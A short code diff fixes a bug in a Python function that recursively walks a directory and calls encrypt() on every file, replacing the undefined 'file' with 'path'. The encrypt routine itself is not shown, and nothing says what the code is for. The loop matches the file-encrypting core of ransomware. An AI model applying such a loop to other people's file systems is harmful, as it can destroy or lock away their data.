@@ -16,7 +16,7 @@ def search_dir(dir):
   for name in os.listdir(dir):
     path = os.path.join(dir, name)
     if os.path.isfile(path) == True:
-      encrypt(file)
+      encrypt(path)
     else:
       search_dir(path)
       
